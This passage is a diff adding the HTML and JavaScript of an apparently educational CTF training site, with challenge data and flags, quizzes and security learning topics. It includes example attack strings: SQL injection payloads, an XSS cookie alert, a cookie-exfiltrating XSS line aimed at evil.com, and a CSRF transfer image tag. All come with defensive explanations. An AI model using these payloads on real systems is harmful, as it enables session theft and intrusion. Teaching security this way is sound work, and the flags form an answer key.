@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>UTech CTF Hub</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #0a0e1a; --bg2: #0f1525; --card: #141c2e; --border: #1e2d4a;
+    --accent: #00d4ff; --accent2: #7c3aed; --green: #00ff88; --red: #ff4466;
+    --yellow: #ffd700; --text: #e2e8f0; --muted: #64748b;
+  }
+  html, body { height: 100%; }
+  body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--text); min-height: 100vh; }
+  button { cursor: pointer; font-family: inherit; }
+  input, select, textarea { font-family: inherit; }
+
+  /* Nav */
+  #nav {
+    background: rgba(15,21,37,.93); border-bottom: 1px solid var(--border);
+    padding: 0 2rem; display: flex; align-items: center; gap: 1.5rem;
+    position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px);
+    flex-wrap: nowrap; overflow-x: auto;
+  }
+  #nav-logo { font-size: 1.3rem; font-weight: bold; color: var(--accent); letter-spacing: 2px; padding: 1rem 0; white-space: nowrap; flex-shrink: 0; }
+  #nav-links { display: flex; flex: 1; overflow-x: auto; gap: .2rem; }
+  .nav-btn {
+    padding: .8rem 1rem; border: none; border-bottom: 2px solid transparent;
+    color: var(--muted); font-size: .9rem; letter-spacing: 1px;
+    background: none; transition: all .2s; white-space: nowrap;
+  }
+  .nav-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+  .nav-btn:hover { color: var(--accent); }
+  #nav-user { display: flex; align-items: center; gap: .8rem; flex-shrink: 0; }
+  #nav-pts { color: var(--accent); font-size: .85rem; }
+  #nav-uname { color: var(--muted); font-size: .85rem; }
+
+  /* Buttons */
+  .btn { background: none; border: 1px solid var(--accent); color: var(--accent); padding: .5rem 1.2rem; font-size: .85rem; letter-spacing: 1px; transition: all .2s; border-radius: 3px; }
+  .btn:hover { background: rgba(0,212,255,.08); }
+  .btn-muted { border-color: var(--muted); color: var(--muted); }
+  .btn-muted:hover { background: rgba(100,116,139,.08); }
+  .btn-red { border-color: var(--red); color: var(--red); }
+  .btn-red:hover { background: rgba(255,68,102,.08); }
+  .btn-yellow { border-color: var(--yellow); color: var(--yellow); }
+  .btn-yellow:hover { background: rgba(255,215,0,.08); }
+  .btn-green { border-color: var(--green); color: var(--green); }
+  .btn-green:hover { background: rgba(0,255,136,.08); }
+  .btn-fill { background: var(--accent); border: 1px solid var(--accent); color: #0a0e1a; padding: .5rem 1.2rem; font-size: .85rem; letter-spacing: 1px; border-radius: 3px; font-weight: bold; }
+  .btn-fill:hover { opacity: .9; }
+  .btn-fill-green { background: var(--green); border-color: var(--green); color: #0a0e1a; }
+  .btn-fill-red { background: var(--red); border-color: var(--red); color: #fff; }
+  .btn-fill-muted { background: var(--muted); border-color: var(--muted); color: #fff; }
+
+  /* Cards / Page */
+  .page { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; }
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: .75rem; letter-spacing: 1px; }
+
+  /* Inputs */
+  .inp {
+    background: var(--bg); border: 1px solid var(--border); color: var(--text);
+    padding: .6rem 1rem; font-size: .9rem; border-radius: 4px; width: 100%; outline: none;
+  }
+  .inp:focus { border-color: var(--accent); }
+  textarea.inp { resize: vertical; }
+
+  /* Auth */
+  #auth-wrap { display: flex; align-items: center; justify-content: center; min-height: calc(100vh - 62px); padding: 2rem; }
+  #auth-card { width: 100%; max-width: 400px; text-align: center; }
+  #auth-logo { font-size: 3rem; margin-bottom: 1rem; }
+  #auth-title { color: var(--accent); margin-bottom: .5rem; letter-spacing: 3px; }
+  #auth-sub { color: var(--muted); margin-bottom: 2rem; font-size: .85rem; }
+  #auth-toggle { display: flex; gap: .5rem; margin-bottom: 1.5rem; }
+  #auth-toggle button { flex: 1; }
+  #auth-error { color: var(--red); margin-bottom: .8rem; font-size: .85rem; }
+  #auth-hint { color: var(--muted); margin-top: 1rem; font-size: .8rem; }
+
+  /* Learn */
+  .learn-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px,1fr)); gap: 1rem; }
+  .learn-card { cursor: pointer; transition: border-color .2s; }
+  .learn-card:hover { border-color: var(--accent) !important; }
+  .code-block { background: var(--bg); border: 1px solid var(--border); padding: .8rem; border-radius: 4px; margin-bottom: .5rem; font-family: monospace; font-size: .85rem; color: var(--green); }
+  .point-item { padding: .4rem 0; border-bottom: 1px solid var(--border); display: flex; gap: .8rem; font-size: .9rem; }
+  .point-num { color: var(--accent); flex-shrink: 0; }
+
+  /* Challenges */
+  .ch-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px,1fr)); gap: 1rem; }
+  .ch-card { cursor: pointer; position: relative; transition: border-color .2s; }
+  .ch-card:hover { border-color: var(--accent); }
+  .ch-solved { border-color: var(--green) !important; opacity: .8; }
+  .ch-solved:hover { border-color: var(--green) !important; }
+  .desc-box { background: var(--bg); border: 1px solid var(--border); border-radius: 6px; padding: 1.5rem; margin-bottom: 1.5rem; line-height: 1.7; font-size: .95rem; }
+  .flag-row { display: flex; gap: .8rem; margin-bottom: 1rem; flex-wrap: wrap; }
+  .flag-row .inp { flex: 1; min-width: 200px; }
+  .result-box { border-radius: 4px; padding: 1rem; margin-bottom: 1rem; }
+  .result-ok { background: rgba(0,255,136,.07); border: 1px solid rgba(0,255,136,.3); color: var(--green); }
+  .result-err { background: rgba(255,68,102,.07); border: 1px solid rgba(255,68,102,.3); color: var(--red); }
+  .hint-box { background: rgba(255,215,0,.07); border: 1px solid rgba(255,215,0,.3); border-radius: 4px; padding: 1rem; margin-bottom: 1rem; color: var(--yellow); font-size: .9rem; }
+  .learn-box { margin-top: 1.5rem; }
+
+  /* Scoreboard */
+  .sb-table { width: 100%; border-collapse: collapse; }
+  .sb-table th { padding: .8rem; text-align: left; color: var(--muted); font-size: .8rem; letter-spacing: 1px; border-bottom: 2px solid var(--border); }
+  .sb-table td { padding: 1rem .8rem; border-bottom: 1px solid var(--border); }
+
+  /* Jeopardy */
+  .jeopardy-table { border-collapse: collapse; width: 100%; min-width: 700px; }
+  .jeopardy-table th { background: var(--accent2); color: #fff; padding: .8rem .5rem; font-size: .8rem; letter-spacing: 1px; text-align: center; border: 2px solid var(--bg); }
+  .j-tile { text-align: center; padding: 1.5rem 1rem; cursor: pointer; font-weight: bold; font-size: 1.3rem; transition: background .2s; color: var(--yellow); background: var(--card); }
+  .j-tile.solved { color: var(--muted); text-decoration: line-through; cursor: default; background: rgba(100,116,139,.13); }
+  .j-tile:not(.solved):hover { background: rgba(0,212,255,.08); }
+  .jep-pts { font-size: 2rem; font-weight: bold; color: var(--yellow); }
+
+  /* Quiz */
+  .progress-bar-bg { background: var(--bg); border-radius: 4px; height: 6px; margin-bottom: 2rem; }
+  .progress-bar-fill { background: var(--accent); height: 100%; border-radius: 4px; transition: width .3s; }
+  .quiz-option { border: 2px solid var(--border); border-radius: 6px; padding: .9rem 1.2rem; cursor: pointer; transition: all .15s; display: flex; gap: .8rem; align-items: center; margin-bottom: .8rem; }
+  .quiz-option:hover { border-color: var(--accent); background: rgba(0,212,255,.05); }
+  .quiz-option.selected { border-color: var(--accent); background: rgba(0,212,255,.13); }
+  .quiz-opt-letter { font-weight: bold; color: var(--muted); }
+  .quiz-option.selected .quiz-opt-letter { color: var(--accent); }
+  .quiz-result-correct { border-color: var(--green) !important; }
+  .quiz-result-wrong { border-color: var(--red) !important; }
+  .review-correct { background: rgba(0,255,136,.13); color: var(--green); }
+  .review-wrong { background: rgba(255,68,102,.13); color: var(--red); }
+
+  /* Admin */
+  .stats-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card { text-align: center; }
+  .stat-val { font-size: 2rem; font-weight: bold; }
+  .ch-row { display: flex; align-items: center; gap: 1rem; padding: .8rem 1.2rem; flex-wrap: wrap; margin-bottom: .5rem; }
+  .ch-row-title { flex: 1; min-width: 150px; font-weight: bold; }
+  .admin-table { width: 100%; border-collapse: collapse; }
+  .admin-table th { padding: .7rem; text-align: left; color: var(--muted); font-size: .8rem; border-bottom: 2px solid var(--border); }
+  .admin-table td { padding: .7rem; border-bottom: 1px solid var(--border); }
+
+  /* Modal */
+  .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,.7); display: flex; align-items: center; justify-content: center; z-index: 1000; padding: 1rem; }
+  .modal-box { max-width: 600px; width: 100%; }
+  .modal-box-scroll { max-height: 90vh; overflow-y: auto; }
+
+  /* Misc */
+  .flex-row { display: flex; align-items: center; gap: .8rem; flex-wrap: wrap; }
+  .flex-between { display: flex; justify-content: space-between; align-items: center; }
+  .mb05 { margin-bottom: .5rem; }
+  .mb08 { margin-bottom: .8rem; }
+  .mb1  { margin-bottom: 1rem; }
+  .mb15 { margin-bottom: 1.5rem; }
+  .mb2  { margin-bottom: 2rem; }
+  .mt1  { margin-top: 1rem; }
+  .mt15 { margin-top: 1.5rem; }
+  .hidden { display: none !important; }
+  h1.page-title { color: var(--accent); letter-spacing: 3px; margin-bottom: .5rem; }
+  p.page-sub { color: var(--muted); margin-bottom: 2rem; }
+  .diff-section-title { letter-spacing: 2px; margin-bottom: 1rem; display: flex; align-items: center; gap: .8rem; }
+  @media (max-width:600px) {
+    .stats-grid { grid-template-columns: repeat(2,1fr); }
+    #nav { padding: 0 1rem; }
+    .page { padding: 1rem; }
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav id="nav">
+  <span id="nav-logo">🛡️ UTECH CTF</span>
+  <div id="nav-links"></div>
+  <div id="nav-user" class="hidden">
+    <span id="nav-pts">⚡ 0 pts</span>
+    <span id="nav-uname"></span>
+    <button class="btn btn-muted" onclick="logout()">LOGOUT</button>
+  </div>
+</nav>
+
+<!-- PAGES -->
+<div id="page-auth"></div>
+<div id="page-learn"    class="hidden"></div>
+<div id="page-challenges" class="hidden"></div>
+<div id="page-jeopardy" class="hidden"></div>
+<div id="page-quizzes"  class="hidden"></div>
+<div id="page-scoreboard" class="hidden"></div>
+<div id="page-admin"    class="hidden"></div>
+
+<!-- MODAL -->
+<div id="modal" class="modal-overlay hidden" onclick="closeModal(event)">
+  <div class="card modal-box modal-box-scroll" onclick="event.stopPropagation()" id="modal-inner"></div>
+</div>
+
+<script>
+// ============================================================
+// DATA
+// ============================================================
+const INITIAL_CHALLENGES = [
+  {id:1,title:"Base64 Basics",category:"Cryptography",difficulty:"Beginner",points:50,description:"A message has been encoded. Can you decode it? The flag is hidden in this string: ZmxhZ3tiNjRfaXNfbm90X2VuY3J5cHRpb259",flag:"flag{b64_is_not_encryption}",hint:"Base64 is an encoding scheme, not encryption. Use atob() in your browser console or an online decoder.",explanation:"Base64 encodes binary data as ASCII text. It is NOT encryption — anyone can decode it. Never use Base64 to 'hide' sensitive data.",enabled:true},
+  {id:2,title:"ROT13 Revelation",category:"Cryptography",difficulty:"Beginner",points:50,description:"Caesar salad, but simpler. Decode: synt{ebg13_vf_n_pynffvp}",flag:"flag{rot13_is_a_classic}",hint:"ROT13 shifts each letter by 13 positions. A→N, B→O, etc. Try an online ROT13 tool.",explanation:"ROT13 is a simple substitution cipher. Like Base64, it provides zero security. Both are commonly used to lightly obscure spoilers, not secrets.",enabled:true},
+  {id:3,title:"SQL Login Bypass",category:"Web Hacking",difficulty:"Beginner",points:75,description:"This login page has a classic SQL injection vulnerability. The training page accepts: username and password. Try to log in as admin without knowing the password. Use: admin' -- as the username and anything as the password.",flag:"flag{sql_injection_bypassed}",hint:"SQL injection comments out the rest of the query. The -- sequence in SQL comments out everything after it.",explanation:"SQL Injection occurs when user input is concatenated directly into a SQL query. Input like admin'-- closes the string and comments out the password check. Always use parameterised queries / prepared statements.",enabled:true},
+  {id:4,title:"Port Protocol Puzzle",category:"Network Security",difficulty:"Beginner",points:50,description:"A network scan revealed an open port. What service runs on port 22 by default? Submit as: flag{service_name}",flag:"flag{ssh}",hint:"This port is used for secure remote administration of servers.",explanation:"Port 22 is the default port for SSH (Secure Shell). Knowing default service ports is fundamental for network reconnaissance.",enabled:true},
+  {id:5,title:"Hashing vs Plaintext",category:"Data Security",difficulty:"Beginner",points:50,description:"A database dump shows two password columns. Column A: 'password123'. Column B: '482c811da5d5b4bc6d497ffa98491e38'. Which column stores passwords more securely? Submit: flag{column_a} or flag{column_b}",flag:"flag{column_b}",hint:"One is stored as plaintext, the other as a hash. Which one requires extra work to reverse?",explanation:"Column B is an MD5 hash of 'password123'. Hashing is one-way (in theory). However, MD5 is broken for security — use bcrypt, Argon2, or scrypt for password storage.",enabled:true},
+  {id:6,title:"Phishing Spotter",category:"Social Engineering",difficulty:"Beginner",points:75,description:"You receive an email: From: security@paypa1.com | Subject: Your account is suspended! | Link text shows: paypal.com | Actual link: http://paypa1.com/login. List the TWO phishing red flags and submit: flag{lookalike_domain,link_mismatch}",flag:"flag{lookalike_domain,link_mismatch}",hint:"Check the sender domain carefully. Then compare the displayed link vs the actual href.",explanation:"Phishing attacks use: (1) Lookalike domains (paypa1.com vs paypal.com — note the '1'), (2) Link text that shows a legitimate URL but href points elsewhere. Always hover over links before clicking.",enabled:true},
+  {id:7,title:"Vigenère Vault",category:"Cryptography",difficulty:"Intermediate",points:150,description:"Ciphertext: Wmjc{ykxkzivk_miiw_leh} | Key: HACK | Decrypt this Vigenère cipher to find the flag.",flag:"flag{vigenere_good_try}",hint:"The Vigenère cipher uses a repeating key. Each letter in the key shifts the corresponding plaintext letter. Use dCode.fr or a Vigenère decoder online.",explanation:"Vigenère is a polyalphabetic substitution cipher — much stronger than ROT13 but still vulnerable to frequency analysis when the key is short. Modern crypto uses AES, not substitution ciphers.",enabled:true},
+  {id:8,title:"XSS Playground",category:"Web Hacking",difficulty:"Intermediate",points:150,description:"This training page reflects user input unsafely. A hidden admin cookie contains the flag. Your goal is to understand how an attacker would inject: <script>alert(document.cookie)<\/script> into a search field. What is the OWASP category for this? Submit: flag{cross_site_scripting}",flag:"flag{cross_site_scripting}",hint:"XSS = Cross-Site ___. Look at OWASP Top 10 A03:2021.",explanation:"Reflected XSS occurs when user input is returned in the HTTP response without sanitisation. Attackers can steal cookies, hijack sessions, or redirect users. Mitigation: encode output, use CSP headers, HttpOnly cookies.",enabled:true},
+  {id:9,title:"PCAP Secrets",category:"Network Security",difficulty:"Intermediate",points:175,description:"A packet capture analysis challenge. An HTTP GET request was made to http://example.com/files/secret.txt. The response body (decoded from hex) was: 666c61677b7061636b6574735f6e65766572 5f6c6965 . Decode the hex to find the flag.",flag:"flag{packets_never_lie}",hint:"Each pair of hex digits is one ASCII character. 66=f, 6c=l, 61=a, 67=g...",explanation:"HTTP traffic is unencrypted — anyone on the network can read it with tools like Wireshark. Always use HTTPS. PCAPs are goldmines for forensic investigators.",enabled:true},
+  {id:10,title:"IDOR Logic Flaw",category:"Web Hacking",difficulty:"Intermediate",points:175,description:"A web app shows user profiles at /profile?id=1001. You are logged in as user 1001. By changing the ID to 1002, you can view another user's private data. The admin profile (id=9999) contains the flag: flag{idor_access_control_fail}. What category of vulnerability is this? Submit the flag.",flag:"flag{idor_access_control_fail}",hint:"IDOR = Insecure Direct Object Reference. It's OWASP A01:2021 — Broken Access Control.",explanation:"IDOR vulnerabilities occur when an app uses user-controllable input to access objects directly without authorisation checks. Fix: verify the requesting user has permission to access the requested resource.",enabled:true},
+  {id:11,title:"String Extraction",category:"Reverse Engineering",difficulty:"Intermediate",points:200,description:"A binary file was analysed with the 'strings' command. Among the output was: DEBUG_KEY=dGVzdA==, VERSION=2.1, FLAG=ZmxhZ3tyZXZlcnNlX3N0cmluZ3N9, BUILD=production. Find and decode the flag.",flag:"flag{reverse_strings}",hint:"The FLAG value is Base64 encoded. Decode ZmxhZ3tyZXZlcnNlX3N0cmluZ3N9",explanation:"The 'strings' command extracts printable character sequences from binaries. Developers often accidentally leave API keys, passwords, and debug flags in compiled code. Always strip debug symbols from production builds.",enabled:true},
+  {id:12,title:"Jeopardy Blitz",category:"Web Hacking",difficulty:"Intermediate",points:200,description:"A multi-part challenge. Answer: What does CSRF stand for? Submit: flag{cross_site_request_forgery}",flag:"flag{cross_site_request_forgery}",hint:"CSRF forces authenticated users to submit requests they didn't intend. C___ S___ R___ F___.",explanation:"CSRF (Cross-Site Request Forgery) tricks a logged-in user's browser into making an unintended request. Mitigated with CSRF tokens, SameSite cookies, and referer validation.",enabled:true},
+  {id:13,title:"Blind SQLi Simulation",category:"Web Hacking",difficulty:"Advanced",points:300,description:"A login page returns 'Welcome' for valid users and nothing for invalid. No data is echoed. You've determined the query is: SELECT * FROM users WHERE username='INPUT'. Using boolean-based blind SQLi, the payload admin' AND '1'='1 returns Welcome. The payload admin' AND '1'='2 returns nothing. The database name first character ASCII value is 109 (=m). The full DB name encodes to: flag{blind_sqli_mastered}. Submit the flag.",flag:"flag{blind_sqli_mastered}",hint:"Blind SQLi infers data bit-by-bit from true/false responses. Tools like SQLMap automate this. The flag is given — focus on understanding the technique.",explanation:"Blind SQLi is dangerous because no data is directly displayed. Attackers infer information through boolean conditions or timing delays. Defence: parameterised queries, WAF, principle of least privilege for DB accounts.",enabled:true},
+  {id:14,title:"Network Map Pivot",category:"Network Security",difficulty:"Advanced",points:350,description:"Given a network scan: Host 10.0.0.1 (Gateway), Host 10.0.0.5 (Web Server: 80,443 open), Host 10.0.0.10 (DB Server: 3306 open, NOT exposed to internet). An attacker compromised the web server. What is the NEXT target via pivoting and what port? Submit: flag{10.0.0.10_port_3306}",flag:"flag{10.0.0.10_port_3306}",hint:"Pivoting uses a compromised host as a relay to reach hosts not directly accessible. The DB server is only reachable from internal network.",explanation:"Network pivoting allows attackers to reach internal systems through a compromised host. Defence: network segmentation, firewall rules between zones, least privilege on service accounts.",enabled:true},
+  {id:15,title:"RSA Concept Puzzle",category:"Cryptography",difficulty:"Advanced",points:350,description:"RSA public key: n=33, e=7. Factored: p=3, q=11. Compute: φ(n)=(p-1)(q-1). Then find d such that (d × e) mod φ(n) = 1. d × 7 mod 20 = 1. What is d? Submit: flag{d_equals_3}",flag:"flag{d_equals_3}",hint:"φ(33)=(3-1)(11-1)=20. Find d: 3×7=21, 21 mod 20=1. So d=3!",explanation:"RSA works by: (1) Choose primes p,q; (2) n=p×q; (3) φ(n)=(p-1)(q-1); (4) Choose e coprime to φ(n); (5) Compute d=modular inverse of e. Real RSA uses primes with thousands of bits.",enabled:true},
+  {id:16,title:"Backup Exposure",category:"Data Security",difficulty:"Advanced",points:300,description:"A misconfigured web server exposes directory listing at /backups/. Files found: db_backup_2024.sql.gz, config.bak, .env.bak. The .env.bak contains: DB_PASSWORD=supersecret123 and FLAG=flag{misconfigured_backup_exposed}. What is the flag?",flag:"flag{misconfigured_backup_exposed}",hint:"The flag is literally in the scenario description. Focus on why this is dangerous.",explanation:"Exposed backup files are a critical misconfiguration. .env files contain secrets, database credentials, and API keys. Mitigations: deny web access to backup directories, .htaccess rules, security headers, regular security audits.",enabled:true},
+  {id:17,title:"Advanced Crackme",category:"Reverse Engineering",difficulty:"Advanced",points:400,description:"A program checks: if (input XOR 0x42) == 0x26, print 'correct'. What input value makes this true? Remember: X XOR 0x42 = 0x26 means X = 0x26 XOR 0x42. Compute the hex value, convert to decimal, then submit: flag{decimal_value}",flag:"flag{100}",hint:"0x26 XOR 0x42 = 0x64. Convert 0x64 to decimal. 6×16 + 4 = ?",explanation:"XOR is its own inverse: if A XOR B = C, then C XOR B = A. In reverse engineering, XOR obfuscation is extremely common. 0x64 = 100 in decimal.",enabled:true},
+  {id:18,title:"Pretexting Scenario",category:"Social Engineering",difficulty:"Advanced",points:350,description:"An attacker calls IT pretending to be the CEO: 'I'm traveling, locked out of my account, need a password reset NOW — I have a board meeting in 10 minutes.' Best response? A) Reset immediately — it's the CEO. B) Verify through official callback number. C) Ask for employee ID. D) Reset but log it. Submit: flag{option_b}",flag:"flag{option_b}",hint:"Urgency is a social engineering tactic. What process exists to verify identity without relying on the caller's claims?",explanation:"This is a classic vishing (voice phishing) pretexting attack using authority + urgency. Correct response: ALWAYS verify via official callback number. Never reset credentials based on an inbound call alone, regardless of claimed identity.",enabled:true},
+];
+
+const INITIAL_QUIZZES = [
+  {id:1,title:"OWASP Top 10 Basics",description:"Test your knowledge of the most critical web application security risks.",questions:[
+    {q:"What does OWASP stand for?",options:["Open Web Application Security Protocol","Open Worldwide Application Security Project","Online Web App Security Platform","Open Web Access Security Program"],correct:1},
+    {q:"What is the #1 OWASP risk in 2021?",options:["Injection","Broken Access Control","Cryptographic Failures","Security Misconfiguration"],correct:1},
+    {q:"XSS stands for?",options:["Cross-Site Scripting","Cross-Server Security","Cross-Site Session","Cross-System Scripting"],correct:0},
+    {q:"Which attack tricks a logged-in user into submitting unwanted requests?",options:["XSS","SQLi","CSRF","SSRF"],correct:2},
+    {q:"What is IDOR?",options:["Indirect Data Object Reference","Insecure Direct Object Reference","Internet Data Object Routing","Internal Directory Object Request"],correct:1},
+    {q:"A parameterised query primarily prevents which attack?",options:["XSS","CSRF","SQL Injection","Path Traversal"],correct:2},
+    {q:"Which HTTP header helps prevent XSS?",options:["X-Frame-Options","Content-Security-Policy","Strict-Transport-Security","X-Content-Type-Options"],correct:1},
+    {q:"HTTPS protects data in which state?",options:["At rest","In transit","In use","All states"],correct:1},
+    {q:"What does 'principle of least privilege' mean?",options:["Use the cheapest software","Grant only the minimum access needed","Prefer open source","Log all actions"],correct:1},
+    {q:"Which is NOT a valid mitigation for SQL Injection?",options:["Parameterised queries","Input validation","Using HTTPS","Stored procedures"],correct:2},
+  ]},
+  {id:2,title:"Cryptography Fundamentals",description:"How well do you understand the basics of encryption and hashing?",questions:[
+    {q:"Which is a hashing algorithm (NOT encryption)?",options:["AES","RSA","SHA-256","DES"],correct:2},
+    {q:"What is a key property of hashing?",options:["It is reversible","It is one-way","It requires two keys","It is the same as encoding"],correct:1},
+    {q:"Base64 is considered which type of operation?",options:["Encryption","Hashing","Encoding","Compression"],correct:2},
+    {q:"RSA is an example of which cryptographic system?",options:["Symmetric","Hash-based","Asymmetric","Stream cipher"],correct:2},
+    {q:"Which is the most secure password hashing algorithm?",options:["MD5","SHA-1","bcrypt / Argon2","Base64"],correct:2},
+    {q:"In HTTPS, which protocol provides encryption?",options:["HTTP","DNS","TLS","TCP"],correct:2},
+    {q:"What does a digital signature verify?",options:["Encryption strength","Authenticity and integrity","File size","Compression ratio"],correct:1},
+    {q:"AES stands for?",options:["Advanced Encryption Standard","Applied Encryption Suite","Automated Encryption System","Asymmetric Encryption Standard"],correct:0},
+    {q:"Which cipher was used by Julius Caesar?",options:["Vigenère","RSA","Substitution/Caesar cipher","AES"],correct:2},
+    {q:"What is a 'salt' in password hashing?",options:["An encryption key","Random data added before hashing","A type of cipher","A hash collision"],correct:1},
+  ]},
+  {id:3,title:"Network Security Essentials",description:"Ports, protocols, and network attack fundamentals.",questions:[
+    {q:"What port does HTTPS use by default?",options:["80","8080","443","22"],correct:2},
+    {q:"What does a firewall primarily do?",options:["Encrypts traffic","Filters network packets","Stores logs","Assigns IP addresses"],correct:1},
+    {q:"A packet sniffer (like Wireshark) captures which type of traffic most easily?",options:["HTTPS","SSH","HTTP (unencrypted)","VPN"],correct:2},
+    {q:"What is a DDoS attack?",options:["Data Deletion of Services","Distributed Denial of Service","Dynamic DNS over SSL","Direct Data on Systems"],correct:1},
+    {q:"Which port is used by SSH?",options:["21","22","23","25"],correct:1},
+    {q:"DNS primarily converts what to what?",options:["IP to MAC","Domain names to IP addresses","Ports to protocols","HTTP to HTTPS"],correct:1},
+    {q:"A man-in-the-middle attack intercepts communication between?",options:["Two servers","A client and server","Two firewalls","A user and a database"],correct:1},
+    {q:"What does VPN stand for?",options:["Virtual Private Network","Verified Packet Network","Virtual Protocol Node","Variable Port Number"],correct:0},
+    {q:"Which scanning tool is most commonly used for network reconnaissance?",options:["Wireshark","Burp Suite","Nmap","Metasploit"],correct:2},
+    {q:"ARP spoofing exploits which layer of the OSI model?",options:["Layer 7 (Application)","Layer 4 (Transport)","Layer 3 (Network)","Layer 2 (Data Link)"],correct:3},
+  ]},
+];
+
+const LEARN_TOPICS = [
+  {id:1,title:"SQL Injection Basics",icon:"💉",category:"Web Hacking",summary:"Learn how SQL injection works and how to prevent it.",points:["SQL injection inserts malicious SQL code into input fields","The classic payload: ' OR '1'='1 always evaluates to true","Single quotes are the most common injection trigger point","Parameterised queries (prepared statements) are the primary defence","ORMs like Django ORM or Hibernate use parameterised queries by default","Stored procedures can also help if they don't use dynamic SQL","Input validation is a secondary defence layer","Error messages should never reveal database structure","Blind SQLi infers data from boolean responses (no direct output)","Time-based SQLi uses deliberate delays to infer data","SQLMap automates SQLi detection and exploitation","Least-privilege DB accounts limit damage from successful injection","Always audit legacy code for string concatenation in queries","Web Application Firewalls (WAF) can detect common SQLi payloads","Log and monitor abnormal query patterns"],examples:["Payload: ' OR '1'='1' -- logs in without password","Query becomes: SELECT * FROM users WHERE user='' OR '1'='1' --'","Safe query: SELECT * FROM users WHERE username=? (parameter binding)"],challenges:["SQL Login Bypass","Blind SQLi Simulation","IDOR Logic Flaw"]},
+  {id:2,title:"Intro to PCAP Analysis",icon:"📡",category:"Network Security",summary:"Understand how to analyse packet captures to find security events.",points:["PCAP = Packet CAPture — a recording of network traffic","Wireshark is the most popular free PCAP analysis tool","HTTP traffic is plaintext — all data visible in PCAP","HTTPS traffic is encrypted — only metadata visible","Display filters: http, tcp.port==80, ip.addr==10.0.0.1","Follow TCP Stream reveals full conversation content","Export Objects (HTTP) extracts files from HTTP traffic","DNS queries reveal which domains a host is communicating with","Suspicious: large data transfers, unusual ports, beaconing patterns","PCAP is essential for incident response and forensics","tshark is the CLI version of Wireshark","Zeek (formerly Bro) provides higher-level PCAP analysis","PCAPs can reveal credentials sent over HTTP, FTP, Telnet","Network baseline helps identify anomalies","Always obtain legal authorisation before capturing traffic"],examples:["Filter for HTTP POSTs: http.request.method=='POST'","Find all IPs communicating with a host: ip.addr==10.0.0.5","Extract a file: File > Export Objects > HTTP"],challenges:["Port Protocol Puzzle","PCAP Secrets","Network Map Pivot"]},
+  {id:3,title:"Crypto Essentials",icon:"🔐",category:"Cryptography",summary:"The fundamentals of cryptography every security professional must know.",points:["Encryption: reversible transformation using a key (AES, RSA)","Hashing: one-way function, same input always gives same output","Encoding: NOT encryption — Base64, URL encoding are reversible without keys","Symmetric encryption uses the same key for encrypt/decrypt (AES)","Asymmetric encryption uses key pairs — public encrypts, private decrypts (RSA)","SHA-256 produces a 256-bit hash, SHA-512 produces 512-bit","MD5 and SHA-1 are cryptographically broken — don't use for security","bcrypt/Argon2 are purpose-built for password hashing (slow = good)","Salting prevents rainbow table attacks on hashed passwords","Digital signatures verify authenticity and integrity","TLS (Transport Layer Security) secures HTTPS, SMTP, etc.","Perfect Forward Secrecy ensures past sessions can't be decrypted later","Key length matters: RSA 2048-bit minimum, AES-128 minimum","Certificate Authorities (CAs) validate TLS certificate ownership","Quantum computing threatens RSA — post-quantum cryptography is being standardised"],examples:["AES-256-CBC: symmetric, 256-bit key, CBC mode","RSA-2048: asymmetric, used for key exchange and signatures","bcrypt cost factor 12: ~250ms hash time, too slow for brute force"],challenges:["Base64 Basics","ROT13 Revelation","Vigenère Vault","RSA Concept Puzzle"]},
+  {id:4,title:"Social Engineering Awareness",icon:"🎭",category:"Social Engineering",summary:"Understand human-based attacks and how to defend against them.",points:["Social engineering manipulates people, not systems","Phishing: fraudulent emails designed to steal credentials","Spear phishing: targeted phishing against a specific person","Vishing: voice phishing — phone calls posing as authority figures","Smishing: SMS-based phishing","Pretexting: creating a fabricated scenario to extract information","Baiting: leaving infected USB drives in public places","Tailgating: physically following someone through a secure door","Urgency and authority are the two most powerful manipulation tactics","Always verify requests for sensitive actions through official channels","'Too good to be true' offers are almost always social engineering","Security awareness training is the #1 defence","Report suspicious contacts to your security team","No legitimate company will ask for your password","Two-person integrity (2PI) helps prevent insider social engineering"],examples:["Phishing: 'Your account is suspended — click here to verify'","Pretexting: 'Hi, I'm from IT, I need your credentials to fix your account'","Baiting: USB drive labeled 'Salary List Q4 2024' left in car park"],challenges:["Phishing Spotter","Pretexting Scenario"]},
+  {id:5,title:"Web Application Security",icon:"🌐",category:"Web Hacking",summary:"Core concepts for understanding and securing web applications.",points:["The OWASP Top 10 lists the most critical web app vulnerabilities","A01: Broken Access Control — most common vulnerability in 2021","A02: Cryptographic Failures — weak encryption or plaintext data","A03: Injection — SQL, command, LDAP injection","A04: Insecure Design — flawed architecture and design","A05: Security Misconfiguration — default passwords, open directories","A06: Vulnerable Components — outdated libraries with known CVEs","A07: Auth Failures — weak passwords, session management flaws","A08: Software Integrity Failures — unsigned updates, CI/CD attacks","A09: Logging Failures — insufficient monitoring and alerting","A10: SSRF — server-side request forgery","Burp Suite is the standard tool for web app penetration testing","Always test on applications you own or have explicit permission to test","Bug bounty programmes allow ethical disclosure of vulnerabilities","Responsible disclosure: notify vendor before public release"],examples:["IDOR: GET /api/user/1002 when you're user 1001","XSS: <script>document.location='evil.com?c='+document.cookie<\/script>","CSRF: <img src='bank.com/transfer?to=attacker&amount=1000'>"],challenges:["SQL Login Bypass","XSS Playground","IDOR Logic Flaw","Blind SQLi Simulation"]},
